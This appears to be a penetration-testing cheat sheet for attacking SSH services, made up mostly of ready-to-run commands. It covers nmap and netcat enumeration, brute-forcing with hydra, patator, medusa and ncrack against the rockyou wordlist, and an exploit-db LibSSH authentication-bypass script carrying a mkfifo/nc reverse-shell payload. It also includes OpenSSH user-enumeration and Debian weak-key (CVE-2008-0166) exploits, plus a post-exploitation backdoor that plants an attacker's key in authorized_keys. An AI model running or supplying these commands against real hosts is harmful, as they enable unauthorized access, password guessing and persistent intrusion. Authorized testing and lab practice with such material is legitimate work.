# SSH - 22

* If you have usernames test login with username:username
* Vulnerable Versions to user enum: <7.7

```bash
# Enum SSH
# Get version
nmap 10.11.1.1 -p22 -sV
# Get banner
nc 10.11.1.1 22
# Get login banner
ssh root@10.11.11.1
# Get algorythms supporteed
nmap -p22 10.11.1.1 --script ssh2-enum-algos
# Check weak keys
nmap-p22 10.2.1.1 --script ssh-hostkey --script-args ssh_hostkey=full
# Check auth methods
nmap -p22 10.11.1.1 --script ssh-auth-methods --script-args="ssh.user=admin"

# User can ask to execute a command right after authentication before it’s default command or shell is executed
$ ssh -v user@10.10.1.111 id
...
Password:
debug1: Authentication succeeded (keyboard-interactive).
Authenticated to 10.10.1.111 ([10.10.1.1114]:22).
debug1: channel 0: new [client-session]
debug1: Requesting no-more-sessions@openssh.com
debug1: Entering interactive session.
debug1: pledge: network
debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
debug1: Sending command: id
debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
uid=1000(user) gid=100(users) groups=100(users)
debug1: channel 0: free: client-session, nchannels 1
Transferred: sent 2412, received 2480 bytes, in 0.1 seconds
Bytes per second: sent 43133.4, received 44349.5
debug1: Exit status 0

# Check Auth Methods:
$ ssh -v 10.10.1.111
OpenSSH_8.1p1, OpenSSL 1.1.1d  10 Sep 2019
...
debug1: Authentications that can continue: publickey,password,keyboard-interactive

# Force Auth Method:
$ ssh -v 10.10.1.111 -o PreferredAuthentications=password
...
debug1: Next authentication method: password

# BruteForce:
patator ssh_login host=10.11.1.111 port=22 user=root 0=/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt password=FILE0 -x ignore:mesg='Authentication failed.'
hydra -l user -P /usr/share/wordlists/password/rockyou.txt -e s ssh://10.10.1.111
medusa -h 10.10.1.111 -u user -P /usr/share/wordlists/password/rockyou.txt -e s -M ssh
ncrack --user user -P /usr/share/wordlists/password/rockyou.txt ssh://10.10.1.111

# LibSSH Before 0.7.6 and 0.8.4 - LibSSH 0.7.6 / 0.8.4 - Unauthorized Access 
# Id
python /usr/share/exploitdb/exploits/linux/remote/46307.py 10.10.1.111 22 id
# Reverse
python /usr/share/exploitdb/exploits/linux/remote/46307.py 10.10.1.111 22 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.1.111 80 >/tmp/f"

# SSH FUZZ
# https://dl.packetstormsecurity.net/fuzzer/sshfuzz.txt

# cpan Net::SSH2
./sshfuzz.pl -H 10.10.1.111 -P 22 -u user -p user

use auxiliary/fuzzers/ssh/ssh_version_2

# SSH-AUDIT
# https://github.com/arthepsy/ssh-audit                     

# Enum users < 7.7:
# https://www.exploit-db.com/exploits/45233
https://github.com/CaioCGH/EP4-redes/blob/master/attacker/sshUsernameEnumExploit.py
python ssh_user_enum.py --port 2223 --userList /root/Downloads/users.txt IP 2>/dev/null | grep "is a"

# SSH Leaks:
https://shhgit.darkport.co.uk/

# SSH bruteforce
# https://github.com/kitabisa/ssb
```

### Brute force <a href="#brute-force-1" id="brute-force-1"></a>

```bash
hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ssh://<IP> -u -vV
```

### CVE-2008-0166 <a href="#cve-2008-0166" id="cve-2008-0166"></a>

```bash
All SSL and SSH keys generated on Debian-based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected.

https://www.exploit-db.com/exploits/5720

wget https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_rsa_2048_x86.tar.bz2 https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_dsa_1024_x86.tar.bz2

bunzip2 debian_ssh_rsa_2048_x86.tar.bz2 debian_ssh_dsa_1024_x86.tar.bz2
tar -xvf debian_ssh_rsa_2048_x86.tar
tar -xvf debian_ssh_dsa_1024_x86.tar

python 5720 rsa/2048 <IP> <USER> <PORT> <THREADS>
python 5720 dsa/1024 <IP> <USER> <PORT> <THREADS>
```

### SSH backdoor - post exploitation <a href="#ssh-backdoor---post-exploitation" id="ssh-backdoor---post-exploitation"></a>

```bash
# Attacker
ssh-keygen -f <FILENAME>
chmod 600 <FILENAME>
cat <FILENAME>.pub -> copy

# Victim
echo <FILENAME>.pub >> <PATH>/.ssh/authorized_keys

# Connect
ssh -i <FILENAME> <USER>@<IP>
```
